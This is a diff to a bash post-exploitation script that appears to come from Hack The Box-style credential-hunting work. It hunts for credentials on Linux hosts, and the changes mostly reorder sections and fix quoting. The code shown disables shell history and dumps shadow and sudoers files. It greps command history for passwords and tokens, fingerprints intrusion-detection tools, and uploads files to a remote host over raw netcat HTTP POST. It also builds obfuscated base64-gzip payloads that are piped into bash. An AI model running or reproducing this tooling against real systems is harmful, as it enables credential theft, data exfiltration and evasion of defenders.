@@ -1,20 +1,9 @@
 #!/bin/bash
 
-# metalgvc
-VERSION="1.0.4"
-
 export HISTSIZE=0
 export HISTFILE=/dev/null
 
-# HTB Linux Creds Hunting: https://academy.hackthebox.com/module/147/section/1320
-
-# TODO:
-# https://github.com/AlessandroZ/LaZagne
-
-# TODO:
-# - execute remote script thru proxy
-# - detect if script is running in docker/lxc
-# - implement privesc module
+VERSION="1.0.5"
 
 SCRIPT=$0
 INNER_SCRIPT=$1
@@ -40,9 +29,6 @@ function warn() { msg=$1; echo -e "${YELLOW}${msg}${NC}"; }
 function action_search_kerberos_files() {
   header "search kerberos tickets"
   tip "https://academy.hackthebox.com/module/147/section/1657"
-  #tip "import ticket into session: klist -k -t /path/to/keytab && smbclient //dc01/userdir -k -c ls"
-  #tip "extract info: keytabextract.py /path/to/keytab"
-  #tip "klist -k -t /etc/krb5.keytab \n klist \n kinit 'LINUX01\$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab \n smbclient -N -L //DC01/"
 
   find / -name '*keytab*' ! -name '*.py' ! -name '*.pyc' ! -name '*.so' ! -name '*.so.0' ! -name '*.rb' ! -name '*.md' -ls 2>/dev/null
 
@@ -74,22 +60,6 @@ function action_kerberos() {
 
 function action_users() {
 
-  SHADOW_FILES=$(find /etc -name '*shadow*' 2>/dev/null -readable -exec cat {} \;)
-  if [[ -n $SHADOW_FILES ]]; then
-    header "shadow files"
-    warn "shadow files contents:"
-    echo "$SHADOW_FILES"
-    separator
-  fi
-
-  header "/etc/passwd"
-  cat /etc/passwd
-  separator
-
-  header "/etc/group"
-  cat /etc/group
-  separator
-
   header "id"
   id
   separator
@@ -102,13 +72,21 @@ function action_users() {
   ls -la /home
   separator
 
-  header "tail /home/*/.bash*"
-  tail -n 100 /home/*/.bash*
+  header "/etc/passwd"
+  cat /etc/passwd
   separator
 
-  header "ls -la /etc/security"
-  ls -la /etc/security 2>/dev/null
+  header "/etc/group"
+  cat /etc/group
   separator
+
+  SHADOW_FILES=$(find /etc -name '*shadow*' -readable -exec cat {} \; 2>/dev/null)
+  if [[ -n $SHADOW_FILES ]]; then
+    header "shadow files"
+    warn "shadow files contents:"
+    echo "$SHADOW_FILES"
+    separator
+  fi
 
   header "env"
   env
@@ -120,21 +98,26 @@ function action_users() {
     warn "SSL Logging enabled: ${SSLKEYLOGFILE_PATH}; can decrypt TLS traffic"
   fi
 
-  header "history"
-  history
-  separator
-
-  HISTORY_CREDS=$(history | grep -C1 -E '(pass)|(key)|(secret)|(token)|(api)|(pwd)|(ssh)|(gpg)|(pgp)|(login)|(creds)|(auth)')
-  if [[ -n $HISTORY_CREDS ]]; then
-    warn "History possible credentials: ${HISTORY_CREDS}"
-  fi
-
   header "who"
   who
   separator
 
   header "w"
   w
+  separator
+
+  header "users in sudo group"
+  getent group sudo
+
+  header "cat /etc/sudoers"
+  cat /etc/sudoers
+
+  header "ls -la /etc/sudoers.d"
+  ls -la /etc/sudoers.d
+  separator
+
+  header "sudo version"
+  sudo -V
   separator
 
   if which gpg &> /dev/null; then
@@ -163,20 +146,25 @@ function action_users() {
     separator
   fi
 
-  header "users in sudo group"
-  getent group sudo
-  header "cat /etc/sudoers"
-  cat /etc/sudoers
-  header "ls -la /etc/sudoers.d"
-  ls -la /etc/sudoers.d
-  separator
-
-  header "sudo version"
-  sudo -V
-  separator
-
   header "login shells /etc/shells"
   cat /etc/shells
+  separator
+
+  header "history"
+  history
+  separator
+
+  HISTORY_CREDS=$(history | grep -C1 -E '(pass)|(key)|(secret)|(token)|(api)|(pwd)|(ssh)|(gpg)|(pgp)|(login)|(creds)|(auth)')
+  if [[ -n $HISTORY_CREDS ]]; then
+    warn "History possible credentials: ${HISTORY_CREDS}"
+  fi
+
+  header "tail /home/*/.bash*"
+  tail -n 100 /home/*/.bash*
+  separator
+
+  header "ls -la /etc/security"
+  ls -la /etc/security 2>/dev/null
   separator
 }
 
@@ -203,7 +191,6 @@ function action_cron() {
   if which atq &> /dev/null; then
     header "atq"
     atq
-    # at -c <job id>
     separator
   fi
 }
@@ -223,8 +210,8 @@ function action_network() {
 
     local mac_addr
     for iface in $(ls /sys/class/net); do
-      mac_addr=$(cat /sys/class/net/"$interface"/address 2>/dev/null)
-      echo "${iface} \t ${mac_addr}"
+      mac_addr=$(cat "/sys/class/net/${iface}/address" 2>/dev/null)
+      echo -e "${iface} \t ${mac_addr}"
     done
 
     header "cat /proc/net/fib_trie"
@@ -400,7 +387,7 @@ function action_isincontainer() {
     ISINDOCKER=1
   fi
 
-  if [ $(cat /proc/1/cgroup) == "0::/" ]; then
+  if [ "$(cat /proc/1/cgroup)" == "0::/" ]; then
     echo -e "${GREEN}[+]${NC} 'cat /proc/1/cgroup == 0::/' - probably inside Docker"
     ISINDOCKER=1
   fi
@@ -460,7 +447,6 @@ function action_search_projectconfig_files() {
 
   header "projects configs: ${EXTS[*]} IN ${SEARCH_IN[*]}"
   for dir in "${SEARCH_IN[@]}"; do
-    #echo -e "\n${YELLOW}Search in: ${dir}${NC}";
     for ext in "${EXTS[@]}"; do
       find "$dir" -iname "*conf*${ext}" 2>/dev/null | grep -v -E '(/.local/)|(/lib/python)';
       find "$dir" -iname "*setting*${ext}" 2>/dev/null | grep -v -E '(/.local/)|(/lib/python)';
@@ -699,7 +685,6 @@ function action_installed_packages() {
 
   if which apt &> /dev/null; then
     header "installed packages: apt"
-    #apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g'
     apt list --installed
   elif which dpkg &> /dev/null; then
     header "installed packages: dpkg"
@@ -790,16 +775,11 @@ function action_logs_ipurls() {
 # transfer files
 
 function action_send_file_https() {
-  #tip "http(s) server or nc listener must started on remote host:"
-  #tips "openssl req -x509 -out /root/.config/tmpcert.pem -keyout /root/.config/tmpcert.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'"
-  #tips "pipx run uploadserver 443 --server-certificate /root/.config/tmpcert.pem"
-
   local FILEPATH=$1
   local URL=$2
   local HOST="${URL##*://}"
   HOST="${HOST%%/*}"
   local PORT=443
-  #local URLPATH=$(echo "$URL" | cut -d'/' -f4- | sed 's/^/\/;s/$/;/' )
   local URLPATH="/$(echo "$URL" | cut -d'/' -f4-)"
   local FNAME=$(basename "$FILEPATH")
 
@@ -920,24 +900,24 @@ function action_send_file_http() {
     {
       echo -e "POST $URLPATH HTTP/1.1\r"
       echo -e "Host: $HOST\r"
-      echo -e "Content-Type: multipart/form-data; boundary=$boundary\r"
+      echo -e "Content-Type: multipart/form-data; boundary=${boundary}\r"
       echo -e "Content-Length: $(wc -c < <(
-        echo -e "--$boundary\r"
+        echo -e "--${boundary}\r"
         echo -e "Content-Disposition: form-data; name=\"file\"; filename=\"${FNAME}\"\r"
         echo -e "Content-Type: application/octet-stream\r"
         echo -e "\r"
-        cat $FILEPATH
+        cat "$FILEPATH"
         echo -e "\r"
-        echo -e "--$boundary--\r"
+        echo -e "--${boundary}--\r"
       ))\r"
       echo -e "\r"
-      echo -e "--$boundary\r"
+      echo -e "--${boundary}\r"
       echo -e "Content-Disposition: form-data; name=\"file\"; filename=\"${FNAME}\"\r"
       echo -e "Content-Type: application/octet-stream\r"
       echo -e "\r"
-      cat $FILEPATH
+      cat "$FILEPATH"
       echo -e "\r"
-      echo -e "--$boundary--\r"
+      echo -e "--${boundary}--\r"
     } | nc $HOST $PORT
   fi
 }
@@ -1010,14 +990,6 @@ function action_download_file_https() {
     wget --no-check-certificate --user-agent="$UA" "$URL"
     rslt=$?
   fi
-
-  # openssl
-#  if [ "$rslt" -ne 0 ] && which openssl &> /dev/null; then
-#    {
-#      echo -e "GET $URLPATH HTTP/1.1\r\nHost: $HOST\r\nConnection: close\r\n\r\n"
-#    } | openssl s_client -connect "$HOST:$PORT" 2>/dev/null | sed -e '/^$/,$ d' > "$FNAME"
-#    rslt=$?
-#  fi
 
   # try D/L by code php, python, ruby, etc
   if [ "$rslt" -ne 0 ]; then
@@ -1489,47 +1461,47 @@ function script_detect_security_tools() {
     header "detect security & defence tools"
 
     if pgrep auditd &> /dev/null; then
-      echo -e "- Auditd (security audit logging)"
+      echo -e "${GREEN}[+]${NC} Auditd (security audit logging)"
     fi
 
     if pgrep ossec &> /dev/null; then
-      echo -e "- OSSEC (intrusion detection)"
+      echo -e "${GREEN}[+]${NC} OSSEC (intrusion detection)"
     fi
 
     if pgrep iptables &> /dev/null; then
-      echo -e "- iptables (firewall)"
+      echo -e "${GREEN}[+]${NC} iptables (firewall)"
     fi
 
     if pgrep ufw &> /dev/null; then
-      echo -e "- ufw (firewall)"
+      echo -e "${GREEN}[+]${NC} ufw (firewall)"
     fi
 
     if [[ -d /etc/tripwire ]]; then
-      echo -e "- Tripwire (file integrity monitoring)"
+      echo -e "${GREEN}[+]${NC} Tripwire (file integrity monitoring)"
     fi
 
     if [[ -d /etc/aide ]]; then
-      echo -e "- AIDE (file integrity monitoring)"
+      echo -e "${GREEN}[+]${NC} AIDE (file integrity monitoring)"
     fi
 
     if [[ -d /etc/apparmor.d ]]; then
-      echo -e "- AppArmor (application security profiling)"
+      echo -e "${GREEN}[+]${NC} AppArmor (application security profiling)"
     fi
 
     if [[ -d /etc/chkrootkit ]]; then
-      echo -e "- chkrootkit (rootkit scanner)"
+      echo -e "${GREEN}[+]${NC} chkrootkit (rootkit scanner)"
     fi
 
     if [[ -d /etc/selinux ]]; then
-      echo -e "- SELinux (mandatory access control enforcement)"
+      echo -e "${GREEN}[+]${NC} SELinux (mandatory access control enforcement)"
     fi
 
     if [[ -d /etc/fluent-bit ]]; then
-      echo -e "- Fluent Bit (log collection)"
+      echo -e "${GREEN}[+]${NC} Fluent Bit (log collection)"
     fi
 
     if [[ -f /etc/rkhunter.conf ]]; then
-      echo -e "- Rootkit Hunter (rootkit scanner)"
+      echo -e "${GREEN}[+]${NC} Rootkit Hunter (rootkit scanner)"
     fi
 }
 
@@ -1612,8 +1584,6 @@ function script_download_file() {
   elif [[ "$1" == nc* ]]; then
     echo 'TODO nc://'
   fi
-
-  # TODO download file by url http(s):// smb:// ftp:// nc://
 }
 
 function script_fsmon() {
@@ -1641,7 +1611,7 @@ function script_minify() {
   echo 'export HISTSIZE=0' >> "$outpath"
   echo 'export HISTFILE=/dev/null' >> "$outpath"
   echo -n "echo '" >> "$outpath"
-  cat "$filepath" | gzip | base64 -w 0 >> "$outpath"
+  cat "$filepath" | sed '/^\s*$/d' | gzip -9 | base64 -w 0 >> "$outpath"
   echo -n "' | base64 -d | gunzip | bash -s -- \"\$1\" \"\$2\" \"\$3\" \"\$4\" \"\$5\" \"\$6\"" >> "$outpath"
 }
 
@@ -1766,5 +1736,3 @@ case "$INNER_SCRIPT" in
 
   *) help; exit 1 ;;
 esac
-
-# ======================================================================================================================
